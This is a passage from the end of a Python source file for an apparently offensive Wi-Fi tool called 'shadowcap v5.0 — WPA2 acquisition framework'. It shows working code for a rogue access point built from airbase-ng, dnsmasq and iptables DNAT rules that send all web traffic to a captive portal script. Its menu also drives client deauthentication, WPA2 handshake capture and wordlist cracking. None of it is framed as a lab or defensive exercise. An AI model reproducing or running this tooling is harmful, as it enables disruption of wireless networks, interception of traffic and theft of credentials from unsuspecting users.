                                capture_output=True, text=True)
        return result

    try:
        airbase_p = subprocess.Popen(
            ['airbase-ng', '-e', essid, '-c', str(channel), mon],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(6)

        run(['ifconfig', 'at0', 'up'])
        run(['ifconfig', 'at0', '10.0.0.1', 'netmask', '255.255.255.0'])
        ok('at0 → 10.0.0.1')

        for _ in range(12):
            r = subprocess.run(['ip', 'link', 'show', 'at0'], capture_output=True, text=True)
            if 'UP' in r.stdout: ok('at0 interface up'); break
            time.sleep(0.5)
        else:
            raise RuntimeError('at0 never came up')

        subprocess.run('echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward',
                       shell=True, check=True, timeout=5)
        ok('IP forwarding enabled')

        dnsmasq_p = subprocess.Popen(
            ['dnsmasq', '-C', '/etc/dnsmasq.conf', '--log-queries', '--log-dhcp', '--log-facility=-'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        info('waiting for dnsmasq...')
        start = time.time()
        while time.time() - start < 6:
            line = dnsmasq_p.stdout.readline()
            if line:
                print(f'  {DM(line.strip())}')
                if 'started, version' in line: ok('dnsmasq running'); break
            time.sleep(0.1)

        for cmd in reset_cmds:
            try: subprocess.run(cmd, timeout=5)
            except: pass

        for cmd in [
            ['iptables','-t','nat','-A','PREROUTING','-p','tcp','--dport','80','-j','DNAT','--to-destination','10.0.0.1:80'],
            ['iptables','-t','nat','-A','PREROUTING','-p','tcp','--dport','443','-j','DNAT','--to-destination','10.0.0.1:80'],
            ['iptables','-t','nat','-A','POSTROUTING','-j','MASQUERADE'],
        ]:
            subprocess.run(cmd, check=True, timeout=8)
        ok('iptables configured')

        server_path = os.path.expanduser(portal_script)
        if not os.path.isfile(server_path):
            raise FileNotFoundError(f'portal script missing: {server_path}')
        server_p = subprocess.Popen(
            ['python3', server_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        ok(f'captive portal running → {DM(server_path)}')

        print()
        ok(GB('FAKE AP ACTIVE'))
        info('connect device — captive portal should intercept HTTP/HTTPS')
        info(f'debug → tail -f /var/log/syslog | grep dnsmasq')

        anim = Anim('radar', 'rogue AP running')
        anim.start()
        input(f'\n {YL("press ENTER to stop")} ')
        anim.stop()

    except Exception as e:
        err(f'error: {str(e)}')
    finally:
        info('cleaning up...')
        for p in [server_p, dnsmasq_p, airbase_p]:
            try:
                if p and p.poll() is None: p.terminate(); p.wait(timeout=5)
            except:
                try: p.kill()
                except: pass
        for cmd in reset_cmds:
            try: subprocess.run(cmd, timeout=5)
            except: pass
        try:
            subprocess.run('echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward',
                           shell=True, timeout=3)
        except: pass
        ok('fake AP stopped')
    endsection()

# ══════════════════════════════════════════════════════════════════════════════
# MENU
# ══════════════════════════════════════════════════════════════════════════════
_MENU_ITEMS = [
    ('1', 'SCAN',        'passive 25s sweep — airodump-ng',          G),
    ('2', 'TARGETS',     'list discovered access points',             G),
    ('3', 'DEAUTH',      'deauthenticate clients from AP',            G),
    ('4', 'CAPTURE',     'intercept WPA2 handshake + deauth burst',   G),
    ('5', 'FAKE AP',     'rogue access point + captive portal',       YL),
    ('6', 'EXIT',        'terminate session',                         RD),
]

def menu():
    header()
    box_w  = W - 4
    print(GD(f'  ┌{"─"*box_w}┐'))
    print(GD(f'  │') + WH(f'  OPERATIONS{" "*(box_w-12)}') + GD('│'))
    print(GD(f'  ├{"─"*box_w}┤'))

    for key, name, desc, col in _MENU_ITEMS:
        key_s  = col(f' [{key}]')
        name_s = col(f' {name:<10}')
        desc_s = DM(f' {desc}')

        stripped = (
            re.sub(r'\033\[[0-9;]*m', '', key_s)  +
            re.sub(r'\033\[[0-9;]*m', '', name_s) +
            re.sub(r'\033\[[0-9;]*m', '', desc_s)
        )
        pad = box_w - len(stripped) - 1
        print(
            GD('  │') +
            key_s + name_s + desc_s +
            ' ' * max(pad, 0) +
            GD('│')
        )

    print(GD(f'  ├{"─"*box_w}┤'))

    api_status = f'API {DM("→")} {G("authenticated") if JWT_TOKEN else WRN_C("not authenticated")}'
    api_stripped = re.sub(r'\033\[[0-9;]*m', '', api_status)
    pad = box_w - len(api_stripped) - 2
    print(GD('  │') + ' ' + api_status + ' ' * max(pad, 0) + GD('│'))
    print(GD(f'  └{"─"*box_w}┘'))

    print()
    try:
        return input(f'  {DM("shadowcap")} {G("▸")} ').strip()
    except (KeyboardInterrupt, EOFError):
        return '6'

# ══════════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════════
def main():
    if os.geteuid() != 0:
        print(f'\n  {RB("[ FAIL ]")} root required → run with sudo\n')
        sys.exit(1)

    print()
    print(GB('  shadowcap v5.0 — WPA2 acquisition framework'))
    print(YL('  ⚠  create test.txt wordlist in script directory before cracking'))
    print()

    # ── LOGIN FIRST ────────────────────────────────────────────────────────
    if not login_to_api():
        print()
        err("Cannot continue without successful API login")
        sys.exit(1)

    last_scan = None
    mon       = None

    while True:
        ch = menu()

        if ch == '1':
            header('passive scan')
            last_scan = do_scan()
            print()
            input(f'  {DM("press enter to continue...")}')

        elif ch == '2':
            if not last_scan:
                header(); err('no scan data — run [1] first')
                input(f'  {DM("press enter...")}'); continue
            header('targets')
            aps = parse_networks(last_scan)
            pick_target(aps)
            input(f'  {DM("press enter...")}')

        elif ch == '3':
            if not last_scan:
                header(); err('no scan data — run [1] first')
                input(f'  {DM("press enter...")}'); continue
            header('deauth')
            aps    = parse_networks(last_scan)
            target = pick_target(aps)
            if not target: continue
            mon = mon or prepare_monitor('wlan1')
            do_deauth_only(
                mon,
                target.get('BSSID') or target.get('bssid'),
                target.get('channel')
            )
            input(f'\n  {DM("press enter...")}')

        elif ch == '4':
            if not last_scan:
                header(); err('no scan data — run [1] first')
                input(f'  {DM("press enter...")}'); continue
            header('capture + deauth')
            aps    = parse_networks(last_scan)
            target = pick_target(aps)
            if not target: continue
            mon = mon or prepare_monitor('wlan1')
            do_capture_deauth(
                mon,
                target.get('BSSID') or target.get('bssid'),
                target.get('channel'),
                target.get('ESSID') or target.get('essid', '<hidden>')
            )
            print(); input(f'  {DM("press enter...")}')

        elif ch == '5':
            header('fake access point')
            box_w = W - 4
            print(GD(f'  ┌{"─"*box_w}┐'))
            print(GD('  │') + WH(f'  FAKE AP MODE{" "*(box_w-14)}') + GD('│'))
            print(GD(f'  ├{"─"*box_w}┤'))
            for k, label in [('1','FreeWiFi rogue AP'), ('2','custom (coming soon)')]:
                line = f'  {G(f"[{k}]")} {DM(label)}'
                stripped = re.sub(r'\033\[[0-9;]*m', '', line)
                pad = box_w - len(stripped)
                print(GD('  │') + line + ' ' * max(pad,0) + GD('│'))
            print(GD(f'  └{"─"*box_w}┘'))
            print()
            sub = input(f'  {DM("fakeap")} {G("▸")} ').strip()
            if sub == '1':
                mon = mon or prepare_monitor('wlan1')
                do_fake_ap(mon)
            elif sub == '2':
                warn('coming soon')
                input(f'  {DM("press enter...")}')
            else:
                err('invalid option'); time.sleep(0.4)

        elif ch in ('6', 'q', 'exit', 'quit'):
            header()
            anim = Anim('spin', 'terminating session...', duration=1.2)
            anim.run()
            ok('session terminated cleanly')
            print(); show_cur(); break

        else:
            err('invalid option'); time.sleep(0.4)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        show_cur()
        print(f'\n\n  {YL("!")} aborted by user\n')
        sys.exit(0)